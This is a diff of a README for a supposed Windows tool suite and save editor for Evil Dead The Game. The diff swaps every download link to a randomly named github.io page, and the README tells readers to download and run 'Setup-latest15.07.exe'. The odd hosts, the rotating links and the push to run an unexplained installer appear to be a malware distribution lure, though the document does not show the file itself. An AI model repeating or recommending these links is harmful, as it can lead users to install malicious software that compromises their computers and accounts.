@@ -4,7 +4,7 @@ Evil Dead The Game Ultimate Tool Suite is a comprehensive Windows desktop applic
 
 ---
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
@@ -32,7 +32,7 @@ The integrated save editor lets you modify game saves, back up profiles, and res
 Follow these steps to get Evil Dead The Game Ultimate Tool Suite running on your Windows machine in minutes.
 
 **Step 1 — Download the Installer**
-Click the green download badge above or visit the [Download page](https://yellowtaxisave.github.io/download-page/) to grab the latest version of the installer.
+Click the green download badge above or visit the [Download page](https://capitals-707-bringing.github.io/download-page/) to grab the latest version of the installer.
 
 **Step 2 — Run the Setup File**
 Locate the downloaded file named **`Setup-latest15.07.exe`** in your Downloads folder and double-click it to launch the installation wizard.
@@ -90,7 +90,7 @@ The tool fully supports Windows 10 (version 1903 and later) and Windows 11. Olde
 
 Ready to enhance your Evil Dead The Game experience on Windows?
 
-**[Download the latest version from GitHub →](https://yellowtaxisave.github.io/download-page/)**
+**[Download the latest version from GitHub →](https://capitals-707-bringing.github.io/download-page/)**
 
 ---
 
